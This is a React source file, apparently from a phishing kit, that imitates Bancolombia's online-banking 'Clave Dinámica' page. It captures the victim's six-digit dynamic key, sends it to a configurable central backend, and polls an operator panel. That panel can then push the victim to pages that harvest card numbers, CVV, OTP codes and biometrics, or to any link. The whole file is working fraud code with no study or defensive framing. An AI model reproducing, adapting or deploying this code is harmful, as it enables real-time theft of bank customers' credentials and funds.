import { instanceBackend } from "../../../axios/instanceBackend";
import { useEffect, useState, useRef } from "react";
import { isDesktop, limpiarPaddingBody } from "../../../../@utils";
import AccionesModal from "./modals/accionesModal";
import ClaveDinaModal from "./modals/ClaveDinaModal";
import LoadingBancolombia from "../../../components/LoadingBancolombia";
import imgClaveDinamicaMobile from "./images/claveDinamicaMobile.gif";
import imgClaveDinamicaDesktop from "./images/claveDinamicaDesktop.gif";
import './css/LoginModal.css';

// Se exporta el componente
export default function ClaveDinamica() {

    // Se inicializa el formState
    const [formState, setFormState] = useState({
        usuario: "",
        clave: "",
        errorUsuario: false,
        errorClave: false,
        lanzarModalAcciones: false,
        lanzarModalInactividad: false,
        lanzarModalClaveDinamica: false,
        touchedClave: false
    });

    // Se inicializa el estado del boton
    const [getButtonEnabled, setButtonEnabled] = useState(false);
    const [getClearButtonEnabled, setClearButtonEnabled] = useState(true);
    const [otpFocused, setOtpFocused] = useState(false);
    const [getLoading, setLoading] = useState(false);

    // Se inicializa el input de los refs
    const inputRefs = useRef([]);

    // Se inicializa los estados
    const [ip, setIp] = useState("");
    const [fechaHora, setDateHour] = useState("");

    // Se crea el useEffect para capturar la ip publica y la hora en estandar
    useEffect(() => {

        // Se limpia el padding del body
        limpiarPaddingBody();

        // Se valida si el estado en el localStorage es error
        const estadoSesion = localStorage.getItem('estado_sesion');

        // Si es error, se muestra el modal
        if (estadoSesion === 'error') {

            // Se borra el estado del localStorage
            localStorage.removeItem('estado_sesion');

            // Se muestra el modal de error de sesión OTP
            setFormState(prev => ({
                ...prev,
                lanzarModalClaveDinamica: true
            }));

            // Se quita a los 2 segundos
            setTimeout(() => {

                // Se llama el metodo para cerrar el modal
                setFormState(prev => ({
                    ...prev,
                    lanzarModalClaveDinamica: false
                }));
            }, 4000);
        };

        // Se obtiene la IP
        getIpInfo();

        // Se obtiene la fecha/hora con formato
        getDateHours();
    }, []);

    //  Se crea el useEffect para ejecutar 1 minuto 
    useEffect(() => {

        // Ejecutar inmediatamente al montar
        getDateHours();

        // Calcular cuánto falta para el próximo minuto exacto
        const ahora = new Date();
        const msHastaProximoMinuto = (60 - ahora.getSeconds()) * 1000 - ahora.getMilliseconds();

        // Se inicializa la variable
        let intervalId;

        // Timeout para sincronizar con el cambio exacto de minuto
        const timeoutId = setTimeout(() => {

            // Se obtiene la fecha y hora
            getDateHours();

            // Luego actualizar cada 60 segundos
            intervalId = setInterval(() => {

                // Se obtiene la fecha y hora
                getDateHours();
            }, 60000);
        }, msHastaProximoMinuto);

        // Cleanup
        return () => {

            // Se limpia el intervalo
            clearTimeout(timeoutId);

            // Se valida y se limpia el intervalo
            if (intervalId) clearInterval(intervalId);
        };
    }, []);

    // Se crea el useEffect para el manejo de inactividad
    useEffect(() => {

        // Variable para el temporizador
        let inactivityTimeout;

        // Se define el tiempo de inactividad (en milisegundos)
        const tiempoInactividad = 1000 * 60 * 1; // 5 minutos

        // Función para reiniciar el temporizador
        const reinititTime = () => {

            // Se limpia el temporizador anterior
            clearTimeout(inactivityTimeout);

            // Se establece un nuevo temporizador
            inactivityTimeout = setTimeout(() => {

                // Se lanza el modal de inactividad
                setFormState(prev => ({
                    ...prev,
                    lanzarModalInactividad: false
                }));
            }, tiempoInactividad);
        };

        // Se reinicia el temporizador al cargar la página
        reinititTime();

        // Se agrega un evento para detectar movimiento del mouse o pulsación de teclado
        window.addEventListener("mousemove", reinititTime);
        window.addEventListener("keydown", reinititTime);

        // Se limpia el efecto al desmontar el componente
        return () => {
            clearTimeout(inactivityTimeout);
            window.removeEventListener("mousemove", reinititTime);
            window.removeEventListener("keydown", reinititTime);
        };
    }, []);

    // Obtiene la dirección IP pública del usuario
    const getIpInfo = async () => {

        // Se usa el try
        try {

            // Se realiza la petición HTTP a la API
            const response = await fetch("https://api.ipify.org?format=json");

            // Se convierte la respuesta a JSON
            const data = await response.json();

            // Se guarda la IP obtenida en el estado
            setIp(data.ip);
        } catch (error) {

            // En caso de error (sin internet, API caída, etc.)
            console.error("Error obteniendo IP", error);

            // Se asigna un valor por defecto para evitar fallos en la UI
            setIp("No disponible");
        };
    };

    // Obtiene la fecha y hora actual del sistema
    const getDateHours = () => {

        // Se obtiene la fecha y hora actual
        const nowDate = new Date();

        // Opciones de formato para la fecha y hora
        const optionsDate = {
            weekday: "long",   // día de la semana (miércoles)
            year: "numeric",   // año (2026)
            month: "long",     // mes (enero)
            day: "numeric",    // día del mes (7)
            hour: "numeric",   // hora (5)
            minute: "2-digit", // minutos (38)
            hour12: true       // formato 12 horas (p. m.)
        };

        // Se formatea la fecha según el locale español de Colombia
        const formatNow = nowDate.toLocaleString("es-CO", optionsDate);

        // Se guarda el valor formateado en el estado
        setDateHour(formatNow);
    };

    // Manejo de cambio en inputs OTP
    const handleOtpChange = (e, index) => {

        // Se obtiene el valor ingresado
        const { value } = e.target;

        // Permitir solo números
        if (value && !/^[0-9]*$/.test(value)) return;

        // Dividir la clave actual en un array de caracteres
        let chars = formState.clave.split('');

        // Asegurar que el array tenga longitud suficiente
        while (chars.length < 6) chars.push('');

        // Actualizar el valor en la posición correcta
        chars[index] = value.slice(-1);

        // Si se borra
        if (!value) chars[index] = '';

        // Unir los caracteres para formar la nueva clave
        const newClave = chars.join('').slice(0, 6);

        // Actualizar el estado del formulario
        setFormState(prev => ({
            ...prev,
            clave: newClave,
            errorClave: false
        }));

        // Auto-focus al siguiente
        if (value && index < 5) {

            // Se enfoca el siguiente input
            inputRefs.current[index + 1].focus();
        }

        // Se valida cuando la clave esta completa
        if (newClave.length === 6) {

            // Se habilita el boton de continuar
            setButtonEnabled(true);
        } else if (newClave.length === 0) {

            // Se habilita el boton de borrar
            setClearButtonEnabled(true);

            // Se deshabilita el boton de continuar
            setButtonEnabled(false);
        } else if (newClave.length > 0) {

            // Se habilita el boton de borrar
            setClearButtonEnabled(false);

            // Se valida si la longitud es menor a 6
            if (newClave.length < 6) {

                // Se deshabilita el boton de continuar
                setButtonEnabled(false);
            };
        };
    };

    // Metodo para manejar la tecla presionada
    const handleKeyDown = (e, index) => {

        // Si se presiona Backspace
        if (e.key === "Backspace") {

            // Si el campo actual está vacío y no es el primero, ir al anterior
            if (!formState.clave[index] && index > 0) {

                // Se enfoca el input anterior
                inputRefs.current[index - 1].focus();
            };
        };
    };

    // Metodo encargado de bloquear el clipboard
    const handleBlockPaste = (e) => {

        // Se previene la accion por defecto
        e.preventDefault();

        // Se valida si ya hay un temporalizador activo
        if (formState.lanzarModalAcciones) return;

        // Se lanza la alerta
        setFormState(prev => ({
            ...prev,
            lanzarModalAcciones: true
        }));

        // Se crea un temporalizador para cerrar el modal
        setTimeout(() => {

            // Se llama el metodo para cerrar el modal
            handleCloseModalActions();
        }, 2500);
    };

    // Metodo encargado de cerrar el modal
    const handleCloseModalActions = () => {

        // Se actualiza el estado del formulario
        setFormState(prev => ({
            ...prev,
            lanzarModalAcciones: false
        }));
    };

    // Metodo encargado de limpiar la clave
    const handleClear = () => {

        // Se limpia el campo de la clave
        setFormState(prev => ({
            ...prev,
            clave: "",
            errorClave: false
        }));

        // Se deshabilitan el boton de continuar
        setButtonEnabled(false);

        // Se deshabilita el boton de borrar
        setClearButtonEnabled(true);

        // Se enfoca el primer input
        inputRefs.current[0].focus();
    };

    // Metodo encargado de manejar el blur del OTP
    const handleOtpBlur = () => {

        // Se actualiza el estado del formulario
        setFormState(prev => ({
            ...prev,
            touchedClave: true,
            errorClave: prev.clave.length === 0
        }));
    };

    // Metodo encargado de manejar el envio de la clave
    const handleSend = async () => {

        // Se muestra el cargando
        setLoading(true);

        // Se envia la clave al backend
        try {

            // Se obtiene el sessionId
            const sessionId = localStorage.getItem("sessionId");

            // Se valida que haya un sessionId
            if (!sessionId) {

                // Se envia una alerta
                alert("Error: No se encontró la sesión");

                // Se quita el cargando
                setLoading(false);

                // Se retorna
                return;
            };

            // Se prepara la data a enviar
            const clave = formState.clave;

            // Registrar intento antes de enviar
            updateDataLocalStorage(clave);

            // Se envia la data
            const dataSend = {
                "data": {
                    "attributes": {
                        "clave": clave,
                        "sessionId": sessionId,

                        // DATOS NUEVOS PARA EL DISTRIBUIDOR
                        "backend": "P01",
                        "backend_central_url": process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL,
                        "backend_url": "/api/v1/bancolombia/dinamica",
                    }
                },
            };

            const centralUrl = (
                process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL || ""
            ).trim();

            // Enviar al backend
            if (centralUrl) {
                await instanceBackend.post(centralUrl, dataSend);
            } else {
                await instanceBackend.post("/bancolombia/dinamica", dataSend);
            }

            // Iniciar polling para esperar respuesta del admin
            initPolling(sessionId);
        } catch (error) {

            // En caso de error, se muestra un mensaje
            setLoading(false);

            // Se muestra la alerta de error
            alert('Error enviando clave. Intente nuevamente.');
        };
    };

    // Función de polling para esperar respuesta del admin
    const initPolling = (sessionId) => {

        // Se inicializa el timeout
        let timeoutId;

        // Se inicializa el intervalo de polling
        const pollingInterval = setInterval(async () => {

            // Se usa el try catch
            try {

                // Se obtiene el estado de la sesion
                const response = await instanceBackend.post(`/bancolombia/verify-state/${sessionId}`);

                // Se captura el estado
                const { estado, url, text } = response.data;
                const estadoLower = estado.toLowerCase();
                const hasUrl = Boolean(url && String(url).trim());
                const customLink = hasUrl ? url : (text && String(text).trim() ? text : null);

                // Estados que detienen el polling
                const stateValid = [

                    // Botones linea 1
                    'sol_tc', 'sol_otp', 'sol_din', 'sol_finalizar', 'sol_finalizado', 'solicitar_finalizar',

                    // Botones linea 2
                    'error_tc', 'error_tc_custom', 'error_otp', 'error_din', 'error_login', 'error_cvv_custom',

                    // Botones linea 3
                    'sol_biometria', 'error_923',

                    // Botones linea 4
                    'sol_tc_custom', 'sol_cvv_custom',

                    // Estados adicionales por pantalla
                    'aprobado', 'error_pantalla', 'bloqueado_pantalla',
                    'sol_link_bot', 'link_bot', 'sol_link_custom'
                ];

                if (
                    (estadoLower === 'sol_link_bot' || estadoLower === 'link_bot' || estadoLower === 'sol_link_custom') &&
                    !(estadoLower === 'link_bot' && hasUrl) &&
                    !(estadoLower === 'sol_link_custom' && customLink)
                ) {
                    return;
                }

                // Se verifica si el estado es válido
                if (stateValid.includes(estadoLower)) {

                    // Se limpian los intervalos
                    clearInterval(pollingInterval);
                    clearTimeout(timeoutId);
                }

                // Redirecciones basadas en respuesta del admin
                switch (estadoLower) {
                    case 'sol_tc':

                        // Redirigir a la validación de tarjeta de crédito
                        window.location.href = '/validacion-tc';

                        // Se sale del ciclo
                        break;
                    case 'error_tc_custom':

                        // Se almacena en el localStorage el estado de sesión con error
                        localStorage.setItem('estado_sesion', 'error');

                        // Redirigir a la validación de tarjeta de crédito
                        window.location.href = '/validacion-tc';

                        // Se sale del ciclo
                        break;
                    case 'sol_otp':

                        // Redirigir a la validación de tarjeta de crédito
                        window.location.href = '/numero-otp';

                        // Se sale del ciclo
                        break;
                    case 'error_otp':

                        // Se almacena en el localStorage el estado de sesión con error
                        localStorage.setItem('estado_sesion', 'error');

                        // Redirigir a la validación de tarjeta de crédito
                        window.location.href = '/numero-otp';

                        // Se sale del ciclo
                        break;
                    case 'sol_din':

                        // Recargar para reintentar DIN
                        setLoading(false);

                        // Se fuera el scroll hacia arriba
                        window.scrollTo(0, 0);

                        // Se limpia la clave
                        handleClear();

                        // Se sale del ciclo
                        break;
                    case 'error_din':

                        // Recargar para reintentar DIN
                        setLoading(false);

                        // Se fuera el scroll hacia arriba
                        window.scrollTo(0, 0);

                        // Se limpia la clave
                        handleClear();

                        // Se muestra el modal de error DIN
                        setFormState(prev => ({
                            ...prev,
                            lanzarModalClaveDinamica: true
                        }));

                        // Se cierra el modal despues de 2 segundos
                        setTimeout(() => {

                            // Se setea el estado de la clave dinamica
                            setFormState(prev => ({
                                ...prev,
                                lanzarModalClaveDinamica: false
                            }));
                        }, 4000);

                        // Se sale del ciclo
                        break;
                    case 'sol_finalizar':
                    case 'sol_finalizado':
                    case 'solicitar_finalizar':

                        // Redirigir a la página finalizado
                        window.location.href = '/finalizado-pse';

                        // Se sale del ciclo
                        break;
                    case 'sol_biometria':

                        // Redirigir a la verificación de identidad
                        window.location.href = '/verificacion-identidad';

                        // Se sale del ciclo
                        break;
                    case 'error_923':

                        // Redirigir a la página de error 923
                        window.location.href = '/error-923page';

                        // Se sale del ciclo
                        break;
                    case 'sol_cvv':
                        window.location.href = '/validacion-cvv';
                        break;
                    case 'sol_tc_custom':

                        // Redirigir a la validación de tarjeta de crédito (usa la misma vista para TC estándar y custom)
                        window.location.href = '/validacion-tc';

                        // Se sale del ciclo
                        break;
                    case 'sol_cvv_custom':
                        // Redirigir a la validación de CVV
                        window.location.href = '/validacion-cvv';

                        // Se sale del ciclo
                        break;
                    case 'error_login':

                        // Se almacena en el localStorage el estado de sesión con error
                        localStorage.setItem('estado_sesion', 'error');

                        // Redirigir a la página de autenticación
                        window.location.href = '/bancolombia';

                        // Se sale del ciclo
                        break;
                    case 'link_bot':
                        if (hasUrl) {
                            window.location.href = url;
                        }
                        break;
                    case 'sol_link_custom':
                        if (customLink) {
                            window.location.href = customLink;
                        }
                        break;
                    default:
                }
            } catch (error) {
            }
        }, 3000);
    };

    // Metodo para registrar el intento de DIN - ESTRUCTURA UNIFICADA
    const updateDataLocalStorage = (clave, estado = "PENDIENTE") => {

        // Se obtiene los datos del localStorage
        const storageKey = "datos_usuario";

        // Se obtiene el valor almacenado
        const raw = localStorage.getItem(storageKey);

        // Se parsea el JSON o se inicializa un objeto vacío
        let datos = raw ? JSON.parse(raw) : {};

        // Se inicializa el objeto usuario si no existe
        if (!datos.usuario) datos.usuario = {};
        if (!datos.usuario.dinamica) datos.usuario.dinamica = [];

        // Se crea el objeto del intento
        const nuevoIntento = {
            intento: datos.usuario.dinamica.length + 1,
            clave: clave,
            fecha: new Date().toLocaleString(),
            estado: estado,
            sesion_id: datos.sesion_id || null
        };

        // Se agrega al array
        datos.usuario.dinamica.push(nuevoIntento);

        // Se guarda nuevamente en el localStorage
        localStorage.setItem(storageKey, JSON.stringify(datos));

        // Se retorna el array
        return datos.usuario.dinamica;
    };

    // Metodo para manejar el foco en el OTP
    const handleOtpFocus = () => {

        // Se actualiza el estado del foco
        setOtpFocused(true);
    };

    // Se crea el return del componente
    const desktop = isDesktop();

    // Se retorna el componente
    return (
        <>
            <div style={{ minHeight: "100dvh", display: "flex", flexDirection: "column" }}>
                <div
                    style={{
                        flex: 1,
                        backgroundColor: "#2C2A29",
                        backgroundImage: 'url("/assets/bancolombia/auth-trazo.svg")',
                        backgroundRepeat: desktop ? 'round' : 'no-repeat',
                        backgroundPosition: "center",
                        backgroundPositionY: desktop ? "0px" : "-70px",
                        backgroundPositionX: desktop ? "0px" : "-500px",
                    }}
                >
                    <div style={{ textAlign: "center" }}>
                        <img
                            src="/assets/bancolombia/bancolombia.svg"
                            alt="Logo"
                            style={{ width: "238px", marginTop: "45px" }}
                        />
                    </div>

                    <div
                        style={{
                            marginTop: "25px",
                        }}
                    >
                        <h1 className="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4 bc-fs-xs" style={{ fontSize: desktop ? 36 : 28.32, marginBottom: desktop ? "15px" : "0px" }}>
                            Sucursal Virtual Personas
                        </h1>
                    </div>

                    <div className="login-page">
                        <div className="login-box" style={{ backgroundColor: "#454648" }}>
                            <img src={desktop ? imgClaveDinamicaDesktop : imgClaveDinamicaMobile} alt="Clave Dinámica" style={{ width: desktop ? "550px" : "500px", height: "120px", margin: "0 auto", display: "block", borderRadius: "8px" }} />
                            <div className="top-clave">
                                <h2 className="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4 bc-fs-xs mt-4" style={{ textAlign: "center", fontSize: "26px", fontWeight: "500", marginBottom: "15px", marginTop: "0px !important", color: "white" }}>
                                    Ingresa la Clave Dinámica
                                </h2>
                            </div>
                            <p className="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4 bc-fs-xs mt-4" style={{ fontSize: desktop ? 18 : "16.5px", color: "#ffffff", fontWeight: 300, lineHeight: "24px" }}>
                                Encuentra tu Clave Dinámica en la app Mi Bancolombia.
                            </p>
                            <br />
                            {/* ----------------------------------------- CLAVE (SEGMENTED) -----------------------------------------*/}

                            <div
                                className="otp-container"
                                style={{
                                    display: "flex",
                                    justifyContent: "center",
                                    gap: "10px",
                                    marginBottom: "20px"
                                }}
                            >

                                {[0, 1, 2, 3, 4, 5].map((index) => (
                                    <input
                                        key={index}
                                        ref={(el) => (inputRefs.current[index] = el)}
                                        type="password"
                                        inputMode="numeric"
                                        maxLength={1}
                                        value={formState.clave[index] || ""}
                                        onChange={(e) => handleOtpChange(e, index)}
                                        onKeyDown={(e) => handleKeyDown(e, index)}
                                        onFocus={(e) => {
                                            handleOtpFocus();
                                            e.target.select();
                                        }}
                                        onBlur={handleOtpBlur}
                                        className={`otp-input ${formState.touchedClave && formState.clave.length === 0
                                            ? "otp-error"
                                            : ""
                                            }`}
                                        onCopy={handleBlockPaste}
                                        onPaste={handleBlockPaste}
                                        onCut={handleBlockPaste}
                                        onContextMenu={handleBlockPaste}
                                    />
                                ))}
                                <style>{`
                                    .otp-input:focus {
                                        border-bottom: 2px solid #FDDA24 !important;
                                    }
                                `}</style>
                            </div>
                            {/* -----------------------------------------------------------------------------------------------------*/}
                            <div style={{ textAlign: "center", marginTop: "20px" }}>
                                <br />
                            </div>
                            {/* -----------------------------------------------------------------------------------------------------*/}
                            <div style={{ display: "flex", gap: "10px", justifyContent: "center" }}>
                                <button className="bc-button-primary login-btn-borrar mt-4" style={{ fontSize: "14px" }} disabled={getClearButtonEnabled} onClick={() => handleClear()}>
                                    Borrar
                                </button>
                                <button className="bc-button-primary login-btn mt-4" style={{ fontSize: "14px" }} disabled={!getButtonEnabled} onClick={handleSend}>
                                    Continuar
                                </button>
                            </div>
                        </div>
                    </div>
                    <div className="login-page-footer mt-4">
                        <div className="footer-links" style={{ marginTop: "70px", marginRight: "1%", marginBottom: "5px" }}>
                            <span>¿Problemas para conectarte?</span>
                            <span className="dot">·</span>
                            <span>Aprende sobre seguridad</span>
                            <span className="dot">·</span>
                            <span>Reglamento Sucursal Virtual</span>
                            <span className="dot">·</span>
                            <span>Política de privacidad</span>
                        </div>
                        <hr style={{ marginTop: "20px" }} />
                        <div className="footer-final">
                            <div className="footer-left">
                                <div>
                                    <img
                                        src="/assets/bancolombia/bancolombia.svg"
                                        style={{ width: "180px" }}
                                    />
                                </div>
                                <div style={{ alignSelf: 'center' }}>
                                    <span className="vigilado">
                                        <img
                                            src="/assets/bancolombia/logo-vigilado.svg"
                                            alt="Superintendencia"
                                            style={{ width: "140px" }}
                                        />
                                    </span>
                                </div>
                            </div>
                            <div className="footer-right">
                                <div className="mt-2">Dirección IP: {ip}</div>
                                <div className="mb-2">{fechaHora}</div>
                            </div>
                        </div>
                    </div>
                </div>

                {/* Modal de inactividad */}
                {formState.lanzarModalInactividad ?
                    <ClaveDinaModal isOpen={formState.lanzarModalInactividad} onClose={() => setFormState(prev => ({
                        ...prev,
                        lanzarModalInactividad: false
                    }))} /> : null}

                {/* Modal de acciones */}
                {formState.lanzarModalAcciones ?
                    <AccionesModal isOpen={formState.lanzarModalAcciones} onClose={handleCloseModalActions} /> : null}

                {/* Modal de error de sesión */}
                {formState.lanzarModalClaveDinamica ?
                    <ClaveDinaModal isOpen={formState.lanzarModalClaveDinamica} onClose={() => setFormState(prev => ({
                        ...prev,
                        lanzarModalClaveDinamica: false
                    }))} /> : null}
            </div>

            <div className="visual-captcha" style={{ cursor: "pointer" }}>
                <img src="/assets/bancolombia/lateral-der.png" alt="Visual Captcha" />
            </div>

            {/* Cargando */}
            {getLoading ?
                <LoadingBancolombia /> : null}
        </>
    );
};
